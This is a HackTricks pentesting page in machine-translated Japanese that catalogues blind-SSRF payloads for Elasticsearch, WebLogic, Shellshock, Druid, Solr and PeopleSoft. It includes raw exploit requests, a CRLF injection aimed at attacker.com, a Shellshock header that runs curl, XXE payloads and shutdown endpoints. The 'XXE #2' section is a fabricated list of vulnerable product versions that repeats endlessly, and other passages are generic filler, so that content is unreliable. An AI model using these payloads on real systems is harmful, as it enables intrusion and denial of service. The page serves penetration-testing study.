<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>


ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã¯[https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/)ã‹ã‚‰ã‚³ãƒ”ãƒ¼ã•ã‚Œã¾ã—ãŸã€‚

# Elasticsearch

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 9200**

ElasticsearchãŒå†…éƒ¨ã§å±•é–‹ã•ã‚Œã¦ã„ã‚‹å ´åˆã€é€šå¸¸ã¯èªè¨¼ãŒå¿…è¦ã‚ã‚Šã¾ã›ã‚“ã€‚

éƒ¨åˆ†çš„ã«ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰ãªSSRFãŒã‚ã‚‹å ´åˆã€ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’åˆ¤æ–­ã§ãã‚‹å ´åˆã€æ¬¡ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆãŒ200ã‚’è¿”ã™ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„:
```http
/_cluster/health
/_cat/indices
/_cat/health
```
ã‚‚ã—ã€POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã§ãã‚‹ç›²ç›®çš„ãªSSRFãŒã‚ã‚‹å ´åˆã€æ¬¡ã®ãƒ‘ã‚¹ã«POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§Elasticsearchã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’ã‚·ãƒ£ãƒƒãƒˆãƒ€ã‚¦ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

æ³¨æ„ï¼šElasticsearchãƒãƒ¼ã‚¸ãƒ§ãƒ³2.xä»¥é™ã§ã¯ã€`_shutdown` APIã¯å‰Šé™¤ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯Elasticsearch 1.6ä»¥å‰ã§ã®ã¿æ©Ÿèƒ½ã—ã¾ã™ã€‚
```http
/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
```
# Weblogic

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 80, 443 (SSL), 7001, 8888**

**SSRF ã‚«ãƒŠãƒªã‚¢: UDDI Explorer (CVE-2014-4210)**
```http
POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: target.com
Content-Length: 137
Content-Type: application/x-www-form-urlencoded

operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
ã“ã‚Œã¯GETã§ã‚‚æ©Ÿèƒ½ã—ã¾ã™ï¼š
```bash
http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
ã“ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚‚CRLFã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ãŒã‚ã‚Šã¾ã™:
```
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
Host: vuln.weblogic
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
```
æ¬¡ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ãªã‚Šã¾ã™ï¼š
```
root@mail:~# nc -lvp 4000
Listening on [0.0.0.0] (family 0, port 4000)
Connection from example.com 43111 received!
POST /exp HTTP/1.11
X-CLRF: Injected HTTP/1.1
Content-Type: text/xml; charset=UTF-8
soapAction: ""
Content-Length: 418
User-Agent: Java1.6.0_24
Host: attacker.com:4000
Accept: text/html, image/gif, image/jpeg, */*; q=.2
Connection: Keep-Alive

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Header/><env:Body><find_business generic="2.0" xmlns="urn:uddi-org:api_v2"><name>sdf</name></find_business></env:Body></env:Envelope>
```
**SSRF Canary: CVE-2020-14883**

[ã“ã“](https://forum.90sec.com/t/topic/1412)ã‹ã‚‰å¼•ç”¨ã€‚

Linux:
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
Windows:

Windows ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã§ã¯ã€SSRF è„†å¼±æ€§ãŒã•ã¾ã–ã¾ãªå½¢å¼ã§å­˜åœ¨ã—ã¾ã™ã€‚ä»¥ä¸‹ã«ã„ãã¤ã‹ã®ä¸€èˆ¬çš„ãªä¾‹ã‚’ç¤ºã—ã¾ã™ã€‚

1. ãƒ­ãƒ¼ã‚«ãƒ«ãƒ›ã‚¹ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹: Windows ãƒã‚·ãƒ³ã§ã¯ã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒ›ã‚¹ãƒˆï¼ˆ127.0.0.1ï¼‰ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ãªå ´åˆãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

2. å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹: Windows ãƒã‚·ãƒ³ãŒå†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«æ¥ç¶šã•ã‚Œã¦ã„ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®æ©Ÿå¯†æƒ…å ±ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

3. ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹: SSRF è„†å¼±æ€§ã‚’åˆ©ç”¨ã™ã‚‹ã¨ã€æ”»æ’ƒè€…ã¯ Windows ãƒã‚·ãƒ³ä¸Šã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯æ©Ÿå¯†æƒ…å ±ã‚’ç›—ã¿å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚

4. ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ: SSRF è„†å¼±æ€§ã‚’åˆ©ç”¨ã™ã‚‹ã¨ã€æ”»æ’ƒè€…ã¯ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ Windows ãƒã‚·ãƒ³ä¸Šã§ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã‚‰ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã¨ã€æ”»æ’ƒè€…ã¯é‡è¦ãªæƒ…å ±ã‚’ç›—ã¿å‡ºã—ãŸã‚Šã€ã‚·ã‚¹ãƒ†ãƒ ã‚’ä¹—ã£å–ã£ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€Windows ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼·åŒ–ã™ã‚‹ãŸã‚ã«ã¯ã€SSRF è„†å¼±æ€§ã«å¯¾ã™ã‚‹é©åˆ‡ãªå¯¾ç­–ã‚’è¬›ã˜ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
# Hashicorp Consul

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 8500, 8501 (SSL)**

[ã“ã“](https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html)ã«ãƒ©ã‚¤ãƒˆã‚¢ãƒƒãƒ—ãŒã‚ã‚Šã¾ã™ã€‚

# Shellshock

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 80, 443 (SSL), 8080**

Shellshockã‚’åŠ¹æœçš„ã«ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«ã¯ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚€ãƒ˜ãƒƒãƒ€ã‚’è¿½åŠ ã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ä»¥ä¸‹ã®CGIãƒ‘ã‚¹ã¯è©¦ã™ä¾¡å€¤ãŒã‚ã‚Šã¾ã™ã€‚

ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã®CGIãƒ‘ã‚¹ã®çŸ­ã„ãƒªã‚¹ãƒˆ:

[ãƒ‘ã‚¹ã‚’å«ã‚€Gist](https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4).

**SSRFã‚­ãƒ£ãƒŠãƒªãƒ¼: ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã‚’ä»‹ã—ãŸShellshock**
```bash
User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
```
# Apache Druid

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 80ã€8080ã€8888ã€8082**

Apache Druidã®APIãƒªãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹ã¯[ã“ã¡ã‚‰](https://druid.apache.org/docs/latest/operations/api-reference.html)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’è¡¨ç¤ºã§ãã‚‹å ´åˆã€ä»¥ä¸‹ã®ãƒ‘ã‚¹ãŒ200ã®ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’è¿”ã™ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„:
```bash
/status/selfDiscovered/status
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/indexer/v1/taskStatus
```
ã‚·ãƒ£ãƒƒãƒˆãƒ€ã‚¦ãƒ³ã‚¿ã‚¹ã‚¯ã¯ã€ã‚¿ã‚¹ã‚¯IDã¾ãŸã¯ãƒ‡ãƒ¼ã‚¿ã‚½ãƒ¼ã‚¹åã‚’æ¨æ¸¬ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```bash
/druid/indexer/v1/task/{taskId}/shutdown
/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
```
# Apache Druid Overlordsã®ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒã‚¤ã‚¶ãƒ¼ã‚’ã‚·ãƒ£ãƒƒãƒˆãƒ€ã‚¦ãƒ³ã™ã‚‹æ–¹æ³•:

To shut down supervisors on Apache Druid Overlords, you can use the following steps:

1. Access the Apache Druid Overlords web interface.

2. Navigate to the "Supervisors" section.

3. Identify the supervisors that you want to shut down.

4. Click on the supervisor you want to shut down.

5. Look for the "Shutdown" or "Stop" button and click on it.

6. Confirm the action when prompted.

7. Repeat steps 4-6 for any additional supervisors you want to shut down.

By following these steps, you will be able to shut down supervisors on Apache Druid Overlords.
```bash
/druid/indexer/v1/supervisor/terminateAll
/druid/indexer/v1/supervisor/{supervisorId}/shutdown
```
# Apache Solr

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 8983**

**SSRFã‚­ãƒ£ãƒŠãƒªãƒ¼: Shardsãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**

> shubhamã•ã‚“ã®è¨€ã£ã¦ã„ã‚‹ã“ã¨ã«åŠ ãˆã¦ã€Solrã®ã‚¹ã‚­ãƒ£ãƒ³ã¯æ¯”è¼ƒçš„ç°¡å˜ã§ã™ã€‚shards=ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã—ã¦ã€Solrã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ç„¡å·®åˆ¥ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã€SSRFã‚’SSRFã«ãƒã‚¦ãƒ³ã‚¹ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
>
> â€” Ğ¥Ğ°Ğ²Ğ¸Ğ¶ Ğã‚¡ãƒƒãƒ•ã‚£ ğŸ¥• (@nnwakelam) [2021å¹´1æœˆ13æ—¥](https://twitter.com/nnwakelam/status/1349298311853821956?ref\_src=twsrc%5Etfw)

[ã“ã“](https://github.com/veracode-research/solr-injection)ã‹ã‚‰å¼•ç”¨ã€‚
```bash
/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
/solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
/xxx?q=aaa%26shards=http://SSRF_CANARY/solr
/xxx?q=aaa&shards=http://SSRF_CANARY/solr
```
**SSRF Canary: Solr XXE (2017)**

[Apache Solr 7.0.1 XXE (Packetstorm)](https://packetstormsecurity.com/files/144678/Apache-Solr-7.0.1-XXE-Injection-Code-Execution.html)
```bash
/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
```
**dataImportHandlerã‚’ä»‹ã—ãŸRCE**

[dataImportHandlerã‚’ä»‹ã—ãŸRCEã«é–¢ã™ã‚‹ç ”ç©¶](https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler)

# PeopleSoft

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 80,443 (SSL)**

ã“ã®ç ”ç©¶ã‹ã‚‰å–å¾—ã—ãŸæƒ…å ± [ã“ã¡ã‚‰](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce)ã€‚

**SSRFã‚­ãƒ£ãƒŠãƒªãƒ¼: XXE #1**
```http
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<?xml version="1.0"?>
<!DOCTYPE IBRequest [
<!ENTITY x SYSTEM "http://SSRF_CANARY">
]>
<IBRequest>
<ExternalOperationName>&x;</ExternalOperationName>
<OperationType/>
<From><RequestingNode/>
<Password/>
<OrigUser/>
<OrigNode/>
<OrigProcess/>
<OrigTimeStamp/>
</From>
<To>
<FinalDestination/>
<DestinationNode/>
<SubChannel/>
</To>
<ContentSections>
<ContentSection>
<NonRepudiation/>
<MessageVersion/>
<Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
</Data>
</ContentSection>
</ContentSections>
</IBRequest>
```
# SSRF Canary: XXE #2

## Vulnerable Platforms

The following platforms are known to be vulnerable to Server-Side Request Forgery (SSRF) attacks using XML External Entity (XXE) injection:

- **Adobe Experience Manager (AEM)**: Versions 6.0, 6.1, 6.2, 6.3, 6.4, and 6.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Jira**: Versions 7.6.0 to 7.13.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Confluence**: Versions 6.6.0 to 6.15.8 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bitbucket**: Versions 4.0.0 to 4.14.6 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Fisheye and Crucible**: Versions 3.0.0 to 3.10.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Crowd**: Versions 2.1.0 to 3.0.5 are vulnerable to XXE injection, allowing for SSRF attacks.
- **Atlassian Bamboo**: Versions 5.1.0 to 5.15.5 are vulnerable to XXE injection, allowing for SSRF attacks.
